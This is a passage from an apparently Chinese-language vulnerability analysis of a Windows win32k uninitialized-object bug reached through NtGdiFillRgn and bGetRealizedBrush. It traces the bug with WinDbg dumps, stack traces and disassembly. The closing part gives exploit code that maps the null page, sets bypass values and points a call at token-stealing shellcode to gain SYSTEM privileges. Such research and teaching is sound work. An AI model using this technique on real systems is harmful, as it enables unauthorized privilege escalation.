    969e0560 f6402401        test    byte ptr [eax+24h],1
经过上面的分析，我们需要知道，EBRUSHOBJ+34h位置存放着什么样的值，直接来看EBRUSHOBJ结构体的内容。
    kd> dd 8effcaf8
    8effcaf8  ffffffff 00000000 00000000 00edfc13
    8effcb08  00edfc13 00000000 00000006 00000004
    8effcb18  00000000 00ffffff fe96b7c4 00000000
    8effcb28  00000000 fd2842e8 ffbff968 ffbffe68
这里+34h位置存放的值是fd2842e8，而fd2842e8+1c存放的是
    kd> dd fd2842e8
    fd2842e8  108501ef 00000001 80000000 874635f8
    fd2842f8  00000000 108501ef 00000000 00000000
    fd284308  00000008 00000008 00000020 fd28443c
    fd284318  fd28443c 00000004 00001292 00000001
这里对象不明朗没关系，来看一下+1c位置存放的是什么样的结构，通过kb堆栈回溯（这里由于多次重启堆栈地址发生变化，不影响调试）
    kd> kb
     # ChildEBP RetAddr  Args to Child              
    00 980b09a0 838b34af 00000000 00000000 838ad5a0 win32k!bGetRealizedBrush+0x38
    01 980b09b8 83929b5e 980b0af8 00000001 980b0a7c win32k!pvGetEngRbrush+0x1f
    02 980b0a1c 839ab6e8 fe975218 00000000 00000000 win32k!EngBitBlt+0x337
    03 980b0a54 839abb9d fe975218 980b0a7c 980b0af8 win32k!EngPaint+0x51
    04 980b0c20 83e941ea 00000000 ffbff968 1910076b win32k!NtGdiFillRgn+0x339
跟踪外层函数调用，在NtGdiFillRgn函数中
                EngPaint(
                  (struct _SURFOBJ *)(v5 + 16),
                  (int)&v13,
                  (struct _BRUSHOBJ *)&v18,
                  (struct _POINTL *)(v42 + 1592),
                  v10);                             // 进这里
传入的第一个参数是SURFOBJ对象，来看一下这个对象的内容
    kd> p
    win32k!NtGdiFillRgn+0x334:
    96adbb98 e8fafaffff      call    win32k!EngPaint (96adb697)
    kd> dd esp
    903fca5c  ffb58778 903fca7c 903fcaf8 ffaabd60
第一个参数SURFOBJ的值是ffb58778，继续往后跟踪
    kd> p
    win32k!EngPaint+0x45:
    96adb6dc ff7508          push    dword ptr [ebp+8]
    kd> p
    win32k!EngPaint+0x48:
    96adb6df 8bc8            mov     ecx,eax
    kd> p
    win32k!EngPaint+0x4a:
    96adb6e1 e868e4f8ff      call    win32k!SURFACE::pfnBitBlt (96a69b4e)
    kd> dd 903fcaf8
    903fcaf8  ffffffff 00000000 00000000 00edfc13
    903fcb08  00edfc13 00000000 00000006 00000004
    903fcb18  00000000 00ffffff ffaab7c4 00000000
    903fcb28  00000000 ffb58768 ffbff968 ffbffe68
    903fcb38  ffbbd540 00000006 fe57bc38 00000014
    903fcb48  000000d3 00000001 ffffffff 83f77f01
    903fcb58  83ec0892 903fcb7c 903fcbb0 00000000
    903fcb68  903fcc10 83e17924 00000000 00000000
    kd> dd ffb58768
    ffb58768  068501b7 00000001 80000000 8754b030
    ffb58778  00000000 068501b7 00000000 00000000
    ffb58788  00000008 00000008 00000020 ffb588bc
发现在EBRUSHOBJ+34h位置存放的值，再+10h存放的正是之前的SURFOBJ，也就是说，之前ffb58768+1ch位置存放的就是SURFOBJ+0xc的值，而这个值来看一下SURFOBJ的结构
    typedef struct _SURFOBJ {
      DHSURF dhsurf;
      HSURF  hsurf;
      DHPDEV dhpdev;
      HDEV   hdev;
      SIZEL  sizlBitmap;
      ULONG  cjBits;
      PVOID  pvBits;
      PVOID  pvScan0;
      LONG   lDelta;
      ULONG  iUniq;
      ULONG  iBitmapFormat;
      USHORT iType;
      USHORT fjBitmap;
    } SURFOBJ;
这个位置存放的是hdev对象，正是因为未对这个对象进行初始化直接引用，导致了漏洞的发生。
漏洞利用时，在win32k!bGetRealizedBrush找到一处调用
    .text:BF840810 loc_BF840810:                           ; CODE XREF: bGetRealizedBrush(BRUSH *,EBRUSHOBJ *,int (*)(_BRUSHOBJ *,_SURFOBJ *,_SURFOBJ *,_SURFOBJ *,_XLATEOBJ *,ulong))+2E0j
    .text:BF840810                 mov     ecx, [ebp+P]
    .text:BF840813                 mov     ecx, [ecx+2Ch]
    .text:BF840816                 mov     edx, [ebx+0Ch]
    .text:BF840819                 push    ecx
    .text:BF84081A                 push    edx
    .text:BF84081B                 push    [ebp+var_14]
    .text:BF84081E                 push    eax
    .text:BF84081F                 call    edi             ;
利用call edi可以跳转到我们要的位置，edi来自于a2，也就是未初始化对象赋值，因此我们可以控制这个值，接下来看看利用过程。
利用这个未初始化的对象，可以直接利用零页内存绕过限制，有几处跳转，第一处
          v20 = a2;//v20赋值
          if ( *((_DWORD *)a2 + 284) & 0x200000 && (char *)a3 != (char *)EngRealizeBrush )
          {
            v21 = *((_DWORD *)v5 + 13);
            if ( v21 )
              v22 = (struct _SURFOBJ *)(v21 + 16);
            else
              v22 = 0;
            if ( a3(v5, v22, 0, 0, 0, *((_DWORD *)v5 + 3) | 0x80000000) )// come to this?
            {
              v19 = 1;
              goto LABEL_24;
            }
            v20 = a2;//v20赋值
          }
          v23 = *((_WORD *)v20 + 712);
          if ( !v23 )//这里有一个if语句跳转
            goto LABEL_23;
这时候v20的值是a2，而a2的值来自于 a2 = *(struct EBRUSHOBJ **)(v6 +
28);，之前已经分析过，由于未初始化，这个值为0
那么第一处在v23的if语句跳转中，需要置0+0x590位置的值为不为0的数。
第二处在
          v24 = (struct EBRUSHOBJ *)((char *)v20 + 1426);
          if ( !*(_WORD *)v24 )
            goto LABEL_23;
这个地方又要一个if语句跳转，这个地方需要置0x592位置的值为不为0的数。
最后一处，也就是call edi之前的位置
    .text:BF8407F0                 mov     edi, [eax+748h]//edi赋值为跳板值
    .text:BF8407F6                 setz    cl
    .text:BF8407F9                 inc     ecx
    .text:BF8407FA                 mov     [ebp+var_14], ecx
    .text:BF8407FD ; 134:       if ( v26 )
    .text:BF8407FD                 cmp     edi, esi//这里仍旧是和0比较
    .text:BF8407FF                 jz      short loc_BF840823
这个地方需要edi和esi做比较，edi不为0，这里赋值为替换token的shellcode的值就是不为0的值了，直接可以跳转。
因此，需要在源码中构造这三个位置的值。
    void* bypass_one = (void *)0x590;
    *(LPBYTE)bypass_one = 0x1;
    void* bypass_two = (void *)0x592;
    *(LPBYTE)bypass_two = 0x1;
    void* jump_addr = (void *)0x748;
    *(LPDWORD)jump_addr = (DWORD)TokenStealingShellcodeWin7;
最后替换system token即可完成利用